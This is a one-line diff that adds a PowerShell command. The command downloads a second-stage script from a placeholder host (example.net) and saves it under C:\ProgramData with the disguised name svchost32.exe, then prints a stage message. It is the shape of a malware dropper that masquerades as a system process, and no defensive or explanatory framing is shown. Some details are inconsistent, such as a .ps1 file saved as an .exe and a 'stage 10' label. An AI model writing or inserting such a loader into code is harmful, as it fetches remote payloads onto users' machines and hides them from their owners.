@@ -1,0 +1,1 @@
+$Stage2Url = "https://example.net/stage2.ps1"; $LocalPath = 'C:\ProgramData\svchost32.exe'; (New-Object System.Net.WebClient).DownloadFile($Stage2Url, $LocalPath); Write-Output "stage 10 initialized"; Set-Location -Path $env:TEMP
